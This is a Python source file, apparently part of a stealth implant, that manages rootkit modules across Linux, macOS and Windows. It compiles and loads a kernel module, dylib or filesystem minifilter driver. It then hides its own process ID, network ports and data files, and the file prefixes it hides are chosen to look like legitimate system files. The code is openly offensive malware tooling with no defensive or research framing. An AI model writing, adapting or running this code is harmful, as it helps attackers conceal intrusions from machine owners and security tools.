"""
Rootkit manager — Python orchestrator for kernel-level hiding modules.

Handles the full lifecycle:
  1. Detect platform and available toolchain
  2. Compile the native module (if source is available and headers present)
  3. Load the module (insmod / DYLD_INSERT / fltmc)
  4. Send hide commands for our PID, files, and ports
  5. Unload on shutdown

Gracefully degrades: if compilation fails, root is unavailable, or
the module can't load, it logs a warning and continues without
kernel hiding (user-space stealth still works).

Usage::

    from rootkit.manager import RootkitManager

    mgr = RootkitManager(config)
    if mgr.install():
        mgr.hide_self()
    # ... later ...
    mgr.uninstall()
"""
from __future__ import annotations

import logging
import os
import platform
import shutil
import subprocess
import sys
from pathlib import Path
from typing import Any

from rootkit.ioctl_bridge import KernelBridge

logger = logging.getLogger(__name__)


def _get_platform() -> str:
    return platform.system().lower()


def _native_dir() -> Path:
    """Return path to rootkit/native/<platform>/."""
    base = Path(__file__).parent / "native"
    plat = _get_platform()
    if plat == "darwin":
        return base / "macos"
    if plat == "windows":
        return base / "windows"
    return base / "linux"


class RootkitManager:
    """Manages the lifecycle of kernel-level hiding modules.

    Parameters
    ----------
    config : dict
        The ``rootkit`` section of the configuration.
    """

    def __init__(self, config: dict[str, Any] | None = None) -> None:
        cfg = config or {}
        self._enabled: bool = bool(cfg.get("enabled", False))
        self._auto_compile: bool = bool(cfg.get("auto_compile", True))
        self._platform = _get_platform()
        self._bridge = KernelBridge(cfg)
        self._installed = False

        # What to hide (populated by hide_self or config)
        self._hidden_pids: list[int] = []
        self._hidden_prefixes: list[str] = list(cfg.get("hide_prefixes", []))
        self._hidden_ports: list[int] = list(cfg.get("hide_ports", []))

    # ── Public API ───────────────────────────────────────────────

    @property
    def enabled(self) -> bool:
        return self._enabled

    @property
    def installed(self) -> bool:
        return self._installed

    def install(self) -> bool:
        """Compile (if needed) and load the native kernel module.

        Returns True if the module is loaded and ready.
        Returns False if loading failed (graceful degradation).
        """
        if not self._enabled:
            logger.debug("Rootkit module disabled in config")
            return False

        if self._bridge.is_loaded():
            self._installed = True
            return True

        # Check for root / admin privileges
        if not self._has_privileges():
            logger.debug("Rootkit: insufficient privileges (need root/admin)")
            return False

        # Compile if source is available
        if self._auto_compile:
            if not self._compile():
                logger.debug("Rootkit: native module compilation failed")
                return False

        # Load the module
        if not self._load():
            logger.debug("Rootkit: module loading failed")
            return False

        self._installed = self._bridge.is_loaded()
        if self._installed:
            logger.debug("Rootkit: kernel module loaded successfully")
        return self._installed

    def uninstall(self) -> bool:
        """Unload the kernel module and clean up."""
        if not self._installed:
            return True

        # Unhide everything first
        for pid in self._hidden_pids:
            self._bridge.unhide_pid(pid)
        for port in self._hidden_ports:
            self._bridge.unhide_port(port)

        self._bridge.close()

        # Unload the module
        success = self._unload()
        if success:
            self._installed = False
        return success

    def hide_self(self) -> None:
        """Hide our own PID, data files, and transport ports.

        Call this after install() returns True.
        """
        if not self._installed:
            return

        # Hide our PID
        pid = os.getpid()
        if self._bridge.hide_pid(pid):
            self._hidden_pids.append(pid)
            logger.debug("Rootkit: hid PID %d", pid)

        # Hide file prefixes from config
        for prefix in self._hidden_prefixes:
            self._bridge.hide_file_prefix(prefix)
            logger.debug("Rootkit: hiding files with prefix '%s'", prefix)

        # Hide default data file prefixes
        default_prefixes = [
            ".com.apple.dt.instruments",  # stealth data dir (macOS)
            ".dbus-session",              # stealth data dir (Linux)
            "preferences.db",             # stealth db name
            "cache.db",
            ".null",                      # our control device
        ]
        for prefix in default_prefixes:
            self._bridge.hide_file_prefix(prefix)

        # Hide ports
        for port in self._hidden_ports:
            if self._bridge.hide_port(port):
                logger.debug("Rootkit: hiding port %d", port)

    def get_status(self) -> dict[str, Any]:
        return {
            "enabled": self._enabled,
            "installed": self._installed,
            "module_loaded": self._bridge.is_loaded(),
            "platform": self._platform,
            "hidden_pids": len(self._hidden_pids),
            "hidden_prefixes": len(self._hidden_prefixes),
            "hidden_ports": len(self._hidden_ports),
        }

    # ── Privilege checks ─────────────────────────────────────────

    @staticmethod
    def _has_privileges() -> bool:
        """Check if we have root/admin privileges."""
        if _get_platform() in ("linux", "darwin"):
            return os.geteuid() == 0
        if _get_platform() == "windows":
            try:
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0  # type: ignore
            except Exception:
                return False
        return False

    # ── Compilation ──────────────────────────────────────────────

    def _compile(self) -> bool:
        """Compile the native module from source."""
        native_dir = _native_dir()
        makefile = native_dir / "Makefile"

        if not makefile.exists():
            logger.debug("Rootkit: no Makefile at %s", native_dir)
            return False

        if self._platform == "linux":
            return self._compile_linux(native_dir)
        if self._platform == "darwin":
            return self._compile_macos(native_dir)
        # Windows requires WDK — skip auto-compile
        logger.debug("Rootkit: Windows auto-compile not supported (use WDK)")
        return False

    @staticmethod
    def _compile_linux(native_dir: Path) -> bool:
        """Compile the Linux LKM."""
        # Check for kernel headers
        kdir = Path(f"/lib/modules/{platform.release()}/build")
        if not kdir.is_dir():
            logger.debug("Rootkit: kernel headers not found at %s", kdir)
            return False

        if not shutil.which("make"):
            logger.debug("Rootkit: 'make' not found in PATH")
            return False

        try:
            result = subprocess.run(
                ["make", "-C", str(native_dir)],
                capture_output=True, text=True, timeout=120,
            )
            if result.returncode == 0:
                return (native_dir / "hidemod.ko").exists()
            logger.debug("Rootkit: make failed: %s", result.stderr[:500])
            return False
        except Exception as exc:
            logger.debug("Rootkit: compilation error: %s", exc)
            return False

    @staticmethod
    def _compile_macos(native_dir: Path) -> bool:
        """Compile the macOS interposition dylib."""
        if not shutil.which("clang"):
            logger.debug("Rootkit: 'clang' not found (install Xcode CLT)")
            return False

        try:
            result = subprocess.run(
                ["make", "-C", str(native_dir)],
                capture_output=True, text=True, timeout=30,
            )
            if result.returncode == 0:
                return (native_dir / "interpose.dylib").exists()
            logger.debug("Rootkit: make failed: %s", result.stderr[:500])
            return False
        except Exception as exc:
            logger.debug("Rootkit: compilation error: %s", exc)
            return False

    # ── Module loading ───────────────────────────────────────────

    def _load(self) -> bool:
        """Load the native module into the kernel / process."""
        if self._platform == "linux":
            return self._load_linux()
        if self._platform == "darwin":
            return self._load_macos()
        if self._platform == "windows":
            return self._load_windows()
        return False

    @staticmethod
    def _load_linux() -> bool:
        """Load the LKM via insmod."""
        ko_path = _native_dir() / "hidemod.ko"
        if not ko_path.exists():
            return False
        try:
            result = subprocess.run(
                ["insmod", str(ko_path)],
                capture_output=True, text=True, timeout=10,
            )
            return result.returncode == 0
        except Exception:
            return False

    @staticmethod
    def _load_macos() -> bool:
        """The macOS dylib is loaded via ctypes on first use, not insmod.

        For DYLD_INSERT_LIBRARIES to work system-wide, the process must
        be re-launched with the env var set.  For our use case, we load
        the dylib directly via ctypes.CDLL which gives us control over
        our own process's readdir results.
        """
        dylib_path = _native_dir() / "interpose.dylib"
        return dylib_path.exists()

    @staticmethod
    def _load_windows() -> bool:
        """Load the minifilter via fltmc."""
        sys_path = _native_dir() / "minifilter.sys"
        if not sys_path.exists():
            return False
        try:
            # Register the driver (quote binPath for paths with spaces)
            sc_result = subprocess.run(
                ["sc", "create", "HideFilter", "type=filesys",
                 f'binPath="{sys_path}"'],
                capture_output=True, text=True, timeout=10,
            )
            if sc_result.returncode != 0:
                logger.debug(
                    "sc create failed (rc=%d): %s",
                    sc_result.returncode,
                    sc_result.stderr or sc_result.stdout,
                )
                return False
            # Load via fltmc
            result = subprocess.run(
                ["fltmc", "load", "HideFilter"],
                capture_output=True, text=True, timeout=10,
            )
            return result.returncode == 0
        except Exception:
            return False

    # ── Module unloading ─────────────────────────────────────────

    def _unload(self) -> bool:
        if self._platform == "linux":
            return self._unload_linux()
        if self._platform == "darwin":
            return True  # dylib unloads when process exits
        if self._platform == "windows":
            return self._unload_windows()
        return False

    @staticmethod
    def _unload_linux() -> bool:
        try:
            result = subprocess.run(
                ["rmmod", "hidemod"],
                capture_output=True, text=True, timeout=10,
            )
            return result.returncode == 0
        except Exception:
            return False

    @staticmethod
    def _unload_windows() -> bool:
        try:
            flt_result = subprocess.run(
                ["fltmc", "unload", "HideFilter"],
                capture_output=True, text=True, timeout=10,
            )
            if flt_result.returncode != 0:
                logger.debug(
                    "fltmc unload failed (rc=%d): %s",
                    flt_result.returncode,
                    flt_result.stderr or flt_result.stdout,
                )
                return False

            sc_result = subprocess.run(
                ["sc", "delete", "HideFilter"],
                capture_output=True, text=True, timeout=10,
            )
            if sc_result.returncode != 0:
                logger.debug(
                    "sc delete failed (rc=%d): %s",
                    sc_result.returncode,
                    sc_result.stderr or sc_result.stdout,
                )
                return False

            return True
        except Exception:
            return False
